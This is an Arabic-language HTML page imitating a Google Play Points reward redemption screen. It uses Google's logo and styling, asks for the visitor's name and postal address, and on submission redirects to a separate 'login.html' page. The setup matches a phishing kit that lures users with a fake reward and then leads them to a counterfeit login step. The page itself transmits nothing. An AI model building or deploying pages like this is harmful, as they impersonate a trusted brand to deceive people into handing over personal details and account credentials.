<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>العنوان - Google Play Points</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
            background: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .address-container {
            max-width: 450px;
            width: 100%;
            padding: 48px 40px 36px;
            background: white;
            border: 1px solid #dadce0;
            border-radius: 8px;
        }
        
        .google-logo {
            text-align: center;
            margin-bottom: 16px;
        }
        
        .google-logo img {
            height: 24px;
        }
        
        .address-header {
            text-align: center;
            margin-bottom: 32px;
        }
        
        .address-header h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin: 0 0 8px 0;
            letter-spacing: 0;
        }
        
        .address-header p {
            font-size: 16px;
            color: #5f6368;
            margin: 0;
            font-weight: 400;
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        .form-group label {
            display: block;
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 8px;
            font-weight: 400;
        }
        
        .form-group input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            color: #202124;
            background: white;
            transition: all 0.2s;
            font-family: 'Roboto', Arial, sans-serif;
        }
        
        .form-group input:hover {
            border-color: #bdc1c6;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #1a73e8;
            border-width: 2px;
            padding: 12px 14px;
        }
        
        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
        }
        
        .submit-button {
            width: 100%;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 8px;
            transition: background 0.2s;
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
            letter-spacing: 0.25px;
        }
        
        .submit-button:hover {
            background: #1765cc;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
        }
        
        .submit-button:active {
            background: #1557b0;
        }
        
        .submit-button:disabled {
            background: #dadce0;
            cursor: not-allowed;
            box-shadow: none;
        }

        @media (max-width: 600px) {
            .address-container {
                border: none;
                padding: 24px 20px;
            }
            
            .form-row {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="address-container">
        <div class="google-logo">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
        </div>
        
        <div class="address-header">
            <h1>معلومات العنوان</h1>
            <p>أدخل عنوانك لإكمال عملية الاسترداد</p>
        </div>
        
        <form id="addressForm">
            <div class="form-group">
                <label for="fullName">الاسم الكامل</label>
                <input type="text" id="fullName" required>
            </div>
            
            <div class="form-group">
                <label for="address1">العنوان السطر 1</label>
                <input type="text" id="address1" required>
            </div>
            
            <div class="form-group">
                <label for="address2">العنوان السطر 2 (اختياري)</label>
                <input type="text" id="address2">
            </div>
            
            <div class="form-row">
                <div class="form-group">
                    <label for="city">المدينة</label>
                    <input type="text" id="city" required>
                </div>
                
                <div class="form-group">
                    <label for="postalCode">الرمز البريدي</label>
                    <input type="text" id="postalCode" required>
                </div>
            </div>
            
            <button type="submit" class="submit-button">متابعة</button>
        </form>
    </div>
    
    <script>
        document.getElementById('addressForm').addEventListener('submit', function(e) {
            e.preventDefault();
            window.location.href = 'login.html';
        });
    </script>
</body>
</html>
